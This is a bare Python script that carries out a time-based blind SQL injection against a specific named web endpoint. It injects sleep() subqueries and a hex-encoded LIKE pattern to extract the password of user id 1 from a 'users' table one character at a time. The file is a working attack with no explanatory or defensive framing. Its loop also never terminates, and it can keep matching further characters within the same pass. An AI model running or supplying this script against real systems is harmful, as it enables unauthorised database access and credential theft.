import requests

def main():
    try:
        allinone = []
        num = [int(i) for i in range(0, 10)]
        alpha = [chr(i) for i in range(ord('a'), ord('z') + 1)]
        for a in num:
            allinone.append(str(a))
        for b in alpha:
            allinone.append(b)
        found = ""
        while True:
            for b in allinone:
                u = found + b + "%"
                print("U: {}".format(u))
                url = "http://toronto.alwaysdata.net/time/time.php?id=1 and (select sleep(3) from users where id=1 and password like " + "0x" + u.encode("utf-8").hex() + ")"
                response = requests.get(url)
                if response.elapsed.total_seconds() > 2:
                    print("Matched {}: {}".format(u, response.elapsed.total_seconds()))
                    found += str(b)
    except:
        pass
main()
